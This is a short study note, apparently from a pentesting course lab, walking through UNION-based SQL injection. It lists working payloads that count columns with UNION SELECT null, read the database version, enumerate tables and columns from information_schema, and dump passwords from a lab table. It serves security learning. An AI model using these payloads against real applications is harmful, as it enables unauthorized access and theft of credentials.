SQL Injection Union

Wednesday, October 18, 2023

10:53 AM

-   Send basic payload like a name (Jeremy)

-   Try double and single quote (jeremy\' jeremy\")

-   Try standalone single and double quote or other special characters

> \*MODERN APPS MAY NOT THROW ANY ERRORS BACK FOR US AS CLUES
>
>  

-   Try command with terminator (jeremy\' or 1=1#)

> ![](008_SQL_Injection_Union_000.png){width="4.802083333333333in" height="2.5416666666666665in"}
>
> This return indicates SQL injection vulnerability \# or \-- - are terminators for mysql
>
>  

-   Try jeremy\' union select null#

    -   jeremy\' union select null, null#

    -   jeremy\' union select null, null, null#

    -   Don\'t forget that you can try many more nulls to find the right number of columns

    -   Can reveal table names

> ![](008_SQL_Injection_Union_001.png){width="5.614583333333333in" height="2.1041666666666665in"}
>
> We finally get a hit on 3 null so we know 3 columns are being returned but some of the results may just be hidden from the user

 

-   We can also add version at the end to get version of DB returned

    -   jeremy\' union select null, null, version()#

> ![](008_SQL_Injection_Union_002.png){width="3.9791666666666665in" height="1.9583333333333333in"}
>
>  

-   jeremy\' union select null, null, table_name from information_schema.tables# to pull

> ![](008_SQL_Injection_Union_003.png){width="6.677083333333333in" height="7.0625in"}
>
> Dumps all tables from DB
>
>  

-   jeremy\' union select null, null, column_name from information_schema.columns#

> ![](008_SQL_Injection_Union_004.png){width="6.802083333333333in" height="7.177083333333333in"}
>
> Dump all column names
>
>  

-   jeremy\' union select null, null, password from injection0x01#

> ![](008_SQL_Injection_Union_005.png){width="5.0625in" height="2.90625in"}
>
> Dump them passwords
>
>  
>
>  

\*PLAY AROUND WITH INT AND STR IN YOUR NULL VALUES\* if there is an id column or something like that it may need an int example: null(int) or a number.

 

Portswigger SQL cheat sheet

[SQL injection cheat sheet \| Web Security Academy (portswigger.net)](https://portswigger.net/web-security/sql-injection/cheat-sheet)
